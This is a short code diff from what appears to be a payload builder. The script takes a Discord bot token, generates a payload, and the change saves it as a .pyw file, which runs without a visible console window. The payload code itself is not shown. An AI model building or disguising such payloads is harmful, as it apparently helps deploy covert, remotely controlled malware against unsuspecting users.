@@ -142,7 +142,7 @@ if __name__ == "__main__":
     token = input("Enter your Discord bot token: ")
     try:
         payload = generate_payload(token)
-        with open("payload.py", "w") as file:
+        with open("payload.pyw", "w") as file:
             file.write(payload)
         print(Fore.GREEN, f"Payload created and saved as payload.py")
     except Execption as e:
